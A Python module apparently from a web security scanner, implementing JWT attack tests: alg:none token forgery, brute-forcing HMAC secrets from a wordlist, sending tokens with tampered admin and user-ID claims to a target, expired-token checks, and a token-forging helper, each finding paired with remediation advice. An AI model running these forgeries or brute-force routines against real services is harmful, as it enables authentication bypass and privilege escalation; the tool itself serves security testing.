"""Complete JWT (JSON Web Token) Scanner Module.

Supports algorithm confusion attacks, weak secret brute-forcing,
expired token acceptance, claim tampering, and signature bypass.
"""

import json
import hmac
import hashlib
import time
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urlencode

from utils.http_client import HttpClient
from utils.encoder import Encoder


class JWTScanner:
    """JWT vulnerability scanner."""

    # Common weak secrets for brute-force
    COMMON_SECRETS = [
        'secret', 'password', '123456', '12345678', '1234567890',
        'admin', 'administrator', 'changeme', 'default', 'test',
        'testing', 'jwt_secret', 'jwt-secret', 'jwtsecret', 'key',
        'private', 'private_key', 'privatekey', 'public', 'public_key',
        'supersecret', 'super_secret', 'mysecret', 'my_secret',
        'secret123', 'password123', 'pass123', 'letmein', 'welcome',
        'monkey', 'dragon', 'master', 'qwerty', 'login', 'princess',
        'abc123', 'admin123', 'root', 'toor', 'pass', 'test123',
        'guest', 'iloveyou', 'shadow', 'sunshine', 'trustno1',
        'batman', 'access', 'hello', 'charlie', 'donald', '!@#$%^&*',
        'aa123456', 'password1', 'qwerty123', '1q2w3e4r', 'sunshine1',
        'HS256', 'HS384', 'HS512', 'RS256', 'none', 'null',
        'undefined', 'JWT', 'token', 'auth', 'authentication',
        'authorization', 'bearer', 'session', 'cookie', 'api',
        'api_key', 'apikey', 'app_secret', 'appsecret', 'application',
        'client_secret', 'clientsecret', 'signing_key', 'signingkey',
        'encryption_key', 'encryptionkey', 'hmac', 'hmac_secret',
        'jwt_signing_key', 'jwt_encryption_key', 'token_secret',
        'access_token_secret', 'refresh_token_secret', 'auth_secret',
        'session_secret', 'cookie_secret', 'app_key', 'appkey',
        'master_key', 'masterkey', 'server_secret', 'serversecret',
        'database', 'db_password', 'mysql', 'postgres', 'redis',
        'secret_key', 'secretkey', 'SECRET_KEY', 'SecretKey',
        'your-256-bit-secret', 'your-384-bit-secret', 'your-512-bit-secret',
        'AllYourBase', 'AreAllBelongToUs', 'correct horse battery staple',
        'keyboard cat', 'shhhhh', 'shhhhhared-secret', 'signature',
        'signing', 'symmetric', 'ThisIsASecretKey', 'this_is_a_secret',
    ]

    # Algorithm none variations
    NONE_ALGORITHMS = [
        'none', 'None', 'NONE', 'nOnE', 'noNe', 'NoNe',
        'nONE', 'NonE', 'nONe', 'nonE',
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0):
        """Initialize JWT scanner."""
        self.client = http_client or HttpClient(timeout=timeout)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []

    def scan(self, token: str, url: Optional[str] = None) -> List[Dict[str, Any]]:
        """Run all JWT vulnerability tests.

        Args:
            token: JWT token to test
            url: Optional URL to test token acceptance

        Returns:
            List of findings
        """
        self.findings = []

        # Decode token first
        decoded = self._decode_without_verify(token)
        if not decoded:
            self.findings.append({
                'type': 'Invalid JWT',
                'severity': 'INFO',
                'url': url or 'N/A',
                'parameter': 'token',
                'payload': token[:50] + '...',
                'evidence': 'Token could not be decoded as JWT',
                'remediation': 'N/A',
                'curl_command': '',
            })
            return self.findings

        # Report token information
        header, payload_data, _ = decoded
        self._analyze_token(header, payload_data, token)

        # Test none algorithm
        none_results = self._test_none_algorithm(token)
        if none_results and url:
            # Verify none algorithm token is accepted
            for none_token in none_results:
                if self._verify_token_accepted(none_token, url):
                    self.findings.append({
                        'type': 'JWT Algorithm None Bypass',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': 'Authorization',
                        'payload': none_token,
                        'evidence': 'Server accepts JWT with alg:none (no signature verification)',
                        'remediation': 'Explicitly reject "none" algorithm. Use a strict allowlist of accepted algorithms.',
                        'curl_command': f"curl -k -H 'Authorization: Bearer {none_token}' '{url}'",
                    })
                    break
        elif none_results:
            self.findings.append({
                'type': 'JWT Algorithm None Token Generated',
                'severity': 'HIGH',
                'url': url or 'N/A',
                'parameter': 'Authorization',
                'payload': none_results[0],
                'evidence': 'Generated alg:none token. Test manually against the API.',
                'remediation': 'Explicitly reject "none" algorithm. Use a strict allowlist of accepted algorithms.',
                'curl_command': f"curl -k -H 'Authorization: Bearer {none_results[0]}' '<target_url>'",
            })

        # Test weak secrets
        weak_secret = self._test_weak_secret(token)
        if weak_secret:
            self.findings.append({
                'type': 'JWT Weak Secret',
                'severity': 'CRITICAL',
                'url': url or 'N/A',
                'parameter': 'JWT Secret',
                'payload': f'Secret found: {weak_secret}',
                'evidence': f'JWT signed with weak/common secret: "{weak_secret}". Attacker can forge arbitrary tokens.',
                'remediation': 'Use a strong, randomly generated secret (256+ bits). Rotate secrets regularly.',
                'curl_command': '',
            })

        # Test expired token acceptance
        if url:
            self._test_expired(token, url)

        # Test claim tampering
        tampered_tokens = self._test_claim_tampering(token)
        if tampered_tokens and url:
            for tampered_token, description in tampered_tokens:
                if self._verify_token_accepted(tampered_token, url):
                    self.findings.append({
                        'type': 'JWT Claim Tampering Accepted',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': 'Authorization',
                        'payload': tampered_token,
                        'evidence': f'Server accepts tampered token: {description}',
                        'remediation': 'Always verify JWT signature before trusting claims. Implement proper authorization checks.',
                        'curl_command': f"curl -k -H 'Authorization: Bearer {tampered_token}' '{url}'",
                    })
                    break

        return self.findings

    def _decode_without_verify(self, token: str) -> Optional[Tuple[Dict, Dict, str]]:
        """Decode JWT without signature verification.

        Args:
            token: JWT token string

        Returns:
            Tuple of (header, payload, signature) or None
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode header
            header_json = Encoder.jwt_base64_decode(parts[0])
            header = json.loads(header_json)

            # Decode payload
            payload_json = Encoder.jwt_base64_decode(parts[1])
            payload_data = json.loads(payload_json)

            # Signature (raw)
            signature = parts[2]

            return header, payload_data, signature

        except Exception:
            return None

    def _analyze_token(self, header: Dict, payload: Dict, token: str):
        """Analyze token for informational findings."""
        # Check for sensitive data in payload
        sensitive_keys = ['password', 'secret', 'private_key', 'credit_card', 'ssn']
        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                self.findings.append({
                    'type': 'JWT Contains Sensitive Data',
                    'severity': 'MEDIUM',
                    'url': 'N/A',
                    'parameter': f'claim: {key}',
                    'payload': token[:50] + '...',
                    'evidence': f'JWT payload contains potentially sensitive claim: {key}',
                    'remediation': 'Do not store sensitive data in JWT claims. JWTs are base64-encoded, not encrypted.',
                    'curl_command': '',
                })

        # Check expiration
        if 'exp' not in payload:
            self.findings.append({
                'type': 'JWT Missing Expiration',
                'severity': 'MEDIUM',
                'url': 'N/A',
                'parameter': 'exp claim',
                'payload': token[:50] + '...',
                'evidence': 'JWT does not contain an expiration (exp) claim. Token never expires.',
                'remediation': 'Always include exp claim with a reasonable expiration time.',
                'curl_command': '',
            })
        elif payload['exp'] < time.time():
            self.findings.append({
                'type': 'JWT Token Expired',
                'severity': 'INFO',
                'url': 'N/A',
                'parameter': 'exp claim',
                'payload': token[:50] + '...',
                'evidence': f'Token expired at {payload["exp"]} (current: {int(time.time())})',
                'remediation': 'Ensure expired tokens are rejected by the server.',
                'curl_command': '',
            })

        # Check algorithm
        alg = header.get('alg', '')
        if alg in ('HS256', 'HS384', 'HS512'):
            # HMAC - check if it could be confused with RSA
            if 'kid' in header or 'jku' in header or 'x5u' in header:
                self.findings.append({
                    'type': 'JWT Potential Key Confusion',
                    'severity': 'MEDIUM',
                    'url': 'N/A',
                    'parameter': 'alg + kid/jku/x5u',
                    'payload': token[:50] + '...',
                    'evidence': f'HMAC algorithm ({alg}) with key reference headers. Potential algorithm confusion attack.',
                    'remediation': 'Enforce algorithm on server side. Do not trust the alg header from the token.',
                    'curl_command': '',
                })

    def _test_none_algorithm(self, token: str) -> List[str]:
        """Test algorithm:none bypass.

        Args:
            token: Original JWT token

        Returns:
            List of forged tokens with alg:none
        """
        decoded = self._decode_without_verify(token)
        if not decoded:
            return []

        header, payload_data, _ = decoded
        forged_tokens = []

        for alg_none in self.NONE_ALGORITHMS:
            try:
                # Create new header with none algorithm
                new_header = {**header, 'alg': alg_none}
                header_b64 = Encoder.jwt_base64_encode(json.dumps(new_header, separators=(',', ':')).encode())
                payload_b64 = Encoder.jwt_base64_encode(json.dumps(payload_data, separators=(',', ':')).encode())

                # Token with empty signature
                forged_token = f"{header_b64}.{payload_b64}."
                forged_tokens.append(forged_token)

                # Token with "none" signature variations
                forged_token_dot = f"{header_b64}.{payload_b64}"
                forged_tokens.append(forged_token_dot)

            except Exception:
                continue

        return forged_tokens

    def _test_weak_secret(self, token: str) -> Optional[str]:
        """Brute-force JWT with common weak secrets.

        Args:
            token: JWT token to crack

        Returns:
            The secret if found, None otherwise
        """
        decoded = self._decode_without_verify(token)
        if not decoded:
            return None

        header, _, _ = decoded
        alg = header.get('alg', '')

        # Only test HMAC algorithms
        if alg not in ('HS256', 'HS384', 'HS512'):
            return None

        # Map algorithm to hashlib function
        hash_funcs = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }

        hash_func = hash_funcs.get(alg)
        if not hash_func:
            return None

        # Split token
        parts = token.split('.')
        if len(parts) != 3:
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_signature = parts[2]

        for secret in self.COMMON_SECRETS:
            try:
                # Compute HMAC
                computed = hmac.new(
                    secret.encode(),
                    signing_input,
                    hash_func
                ).digest()

                computed_b64 = Encoder.jwt_base64_encode(computed)

                if computed_b64 == original_signature:
                    return secret

            except Exception:
                continue

        return None

    def _test_expired(self, token: str, url: str):
        """Test if server accepts expired tokens.

        Args:
            token: JWT token
            url: URL to test against
        """
        decoded = self._decode_without_verify(token)
        if not decoded:
            return

        header, payload_data, _ = decoded

        # Check if token is already expired
        exp = payload_data.get('exp')
        if not exp or exp > time.time():
            # Token not expired, create an expired version
            expired_payload = {**payload_data, 'exp': int(time.time()) - 3600}  # 1 hour ago

            # We can only forge if we know the secret
            # Try with the token as-is if it's already expired
            return

        # Token is expired, test if server still accepts it
        if self._verify_token_accepted(token, url):
            self.findings.append({
                'type': 'JWT Expired Token Accepted',
                'severity': 'HIGH',
                'url': url,
                'parameter': 'Authorization',
                'payload': token[:80] + '...',
                'evidence': f'Server accepts expired JWT (exp: {exp}, current: {int(time.time())})',
                'remediation': 'Always validate the exp claim. Reject expired tokens. Implement token refresh mechanism.',
                'curl_command': f"curl -k -H 'Authorization: Bearer {token}' '{url}'",
            })

    def _test_claim_tampering(self, token: str) -> List[Tuple[str, str]]:
        """Test claim tampering (modify role/admin claims).

        Args:
            token: Original JWT token

        Returns:
            List of (tampered_token, description) tuples
        """
        decoded = self._decode_without_verify(token)
        if not decoded:
            return []

        header, payload_data, signature = decoded
        tampered_tokens = []

        # Tampering scenarios
        tamper_scenarios = [
            # Elevate role
            ({'role': 'admin'}, 'role changed to admin'),
            ({'role': 'administrator'}, 'role changed to administrator'),
            ({'role': 'superadmin'}, 'role changed to superadmin'),
            ({'admin': True}, 'admin claim set to true'),
            ({'is_admin': True}, 'is_admin claim set to true'),
            ({'isAdmin': True}, 'isAdmin claim set to true'),
            ({'user_type': 'admin'}, 'user_type changed to admin'),
            ({'privilege': 'admin'}, 'privilege changed to admin'),
            ({'level': 9999}, 'level set to 9999'),
            ({'group': 'admin'}, 'group changed to admin'),
            # Change user ID
            ({'sub': '1'}, 'sub changed to 1 (likely admin)'),
            ({'user_id': 1}, 'user_id changed to 1'),
            ({'uid': 1}, 'uid changed to 1'),
            # Remove restrictions
            ({'verified': True}, 'verified set to true'),
            ({'email_verified': True}, 'email_verified set to true'),
            ({'active': True}, 'active set to true'),
        ]

        for claims_to_add, description in tamper_scenarios:
            try:
                # Only tamper if the claim exists or is relevant
                new_payload = {**payload_data, **claims_to_add}

                # Extend expiration
                new_payload['exp'] = int(time.time()) + 86400  # 24 hours from now

                # Create tampered token (with original signature - won't verify but tests server behavior)
                header_b64 = Encoder.jwt_base64_encode(json.dumps(header, separators=(',', ':')).encode())
                payload_b64 = Encoder.jwt_base64_encode(json.dumps(new_payload, separators=(',', ':')).encode())

                tampered_token = f"{header_b64}.{payload_b64}.{signature}"
                tampered_tokens.append((tampered_token, description))

                # Also try with none algorithm
                none_header = {**header, 'alg': 'none'}
                none_header_b64 = Encoder.jwt_base64_encode(json.dumps(none_header, separators=(',', ':')).encode())
                none_token = f"{none_header_b64}.{payload_b64}."
                tampered_tokens.append((none_token, f"{description} (alg:none)"))

            except Exception:
                continue

        return tampered_tokens

    def _verify_token_accepted(self, token: str, url: str) -> bool:
        """Verify if a token is accepted by the server.

        Args:
            token: JWT token to test
            url: URL to send request to

        Returns:
            True if token appears to be accepted
        """
        try:
            # Try with Authorization: Bearer header
            headers = {'Authorization': f'Bearer {token}'}
            response = self.client.get(url, headers=headers)

            # If we get 200 or similar success, token might be accepted
            if response.status_code in (200, 201, 202, 204):
                return True

            # Compare with no-auth response
            no_auth_resp = self.client.get(url)
            if no_auth_resp.status_code in (401, 403) and response.status_code == 200:
                return True

            return False

        except Exception:
            return False

    def _forge_token(self, header: Dict, payload: Dict, secret: str) -> str:
        """Forge a JWT token with a known secret.

        Args:
            header: JWT header dict
            payload: JWT payload dict
            secret: Signing secret

        Returns:
            Forged JWT token string
        """
        alg = header.get('alg', 'HS256')

        hash_funcs = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }

        hash_func = hash_funcs.get(alg, hashlib.sha256)

        header_b64 = Encoder.jwt_base64_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = Encoder.jwt_base64_encode(json.dumps(payload, separators=(',', ':')).encode())

        signing_input = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(secret.encode(), signing_input, hash_func).digest()
        signature_b64 = Encoder.jwt_base64_encode(signature)

        return f"{header_b64}.{payload_b64}.{signature_b64}"
